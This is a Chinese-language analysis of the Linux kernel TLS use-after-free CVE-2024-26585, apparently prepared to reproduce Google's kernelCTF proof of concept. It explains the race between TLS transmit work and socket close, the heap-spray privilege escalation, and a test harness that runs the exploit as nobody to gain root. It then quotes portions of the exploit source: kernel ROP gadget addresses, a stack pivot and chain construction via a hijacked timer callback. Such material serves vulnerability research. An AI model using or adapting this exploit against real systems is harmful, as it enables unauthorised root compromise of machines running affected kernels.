...
| 影响内核版本 | v4.20 ~ v6.7 |
| 利用技术 | TLS发送工作队列调度与socket关闭的竞争条件 |

## 原始PoC分析

### 参考来源
- **PoC URL**: https://github.com/google/security-research/tree/master/pocs/linux/kernelctf/CVE-2024-26585_lts_cos
- **来源类型**: Google security-research (kernelCTF)

### 利用原理
内核TLS发送路径使用工作队列进行异步加密和发送。在socket关闭时如果tx work仍在执行中，关闭路径可能释放socket相关资源而work handler仍在访问。

攻击者可通过大量并发TLS连接的创建和销毁来稳定触发竞争窗口，随后通过堆喷射技术控制释放后的内存区域实现提权。

### 关键技术点
1. TLS tx work调度与socket close并发导致资源释放竞争
2. work handler访问已释放的TLS context
3. 通过并发连接操作稳定触发竞争窗口
...
### 三阶段验证集成
- **Phase 1 (Prepare)**: 验证内核TLS支持、创建网络测试环境、创建CTF目标文件、记录系统状态快照
- **Phase 2 (Run)**: 降权nobody执行PoC binary，通过TLS tx work竞争触发UAF并提权
...
Source: https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2024-26585_lts_cos/exploit/cos-105-17412.156.69/exploit.c
...
#include "kernelver_17412.156.69.h"
...
/*
        0xffffffff81efbb99:     add rsp, 0x38
        0xffffffff81efbb9d:     pop rbx
        0xffffffff81efbb9e:     pop rbp
        0xffffffff81efbb9f:     pop r12
        0xffffffff81efbba1:     jmp     __x86_return_thunk
*/
        *(uint64_t *) (rdi - 0x1a) = kaddr(0xffffffff81efbb99);

// 0xffffffff81cc65ef: pop rsp ; jmp qword [rsi+0x66]
        *(uint64_t *) (rdi - 0x38) = kaddr(0xffffffff81cc65ef);

/*
        0xffffffff81f6d246:     lea rbp, [rdi - 0x80]
        0xffffffff81f6d24a:     push rbx
        0xffffffff81f6d24b:     mov rbx, rdi
        0xffffffff81f6d24e:     mov rax, qword ptr [rdi + 0x68]
        0xffffffff81f6d252:     mov rdi, rbp
        0xffffffff81f6d255:     call    __x86_indirect_thunk_rax
*/
// timer->function - start of the chain
        *(uint64_t *) (rdi + 0x18) = kaddr(0xffffffff81f6d246);


// 0xffffffff81c65eb1: push   rsi ; jmp    QWORD PTR [rbp+0x48]
        *(uint64_t *) (rdi + 0x50) = kaddr(0xffffffff81ba0c78);

/*
        0xffffffff8190361b:     mov rax, qword ptr [r12 + 0x50]
        0xffffffff81903620:     mov rsi, rbp
        0xffffffff81903623:     mov rdi, r12
        0xffffffff81903626:     call    __x86_indirect_thunk_rax
*/
        *(uint64_t *) (rdi + 0x68) = kaddr(0xffffffff8190361b);
        ...
        *rop++ = kaddr(POP_RDI_PLUS_8);  // rdi - 0x10
        *rop++ = kaddr(RW_BUFFER); // rdi - 0x8

// skip over offsets 0-0x30
        rop += 8;

        *rop++ = kaddr(COPY_USER_GENERIC_STRING);  // 0x40
        *rop++ = kaddr(POP_RCX); // 0x48

// SKip over 0x50
        rop += 1;

        *rop++ = kaddr(POP_RSP);  // 0x58
        *rop++ = kaddr(RW_BUFFER); // 0x60
}
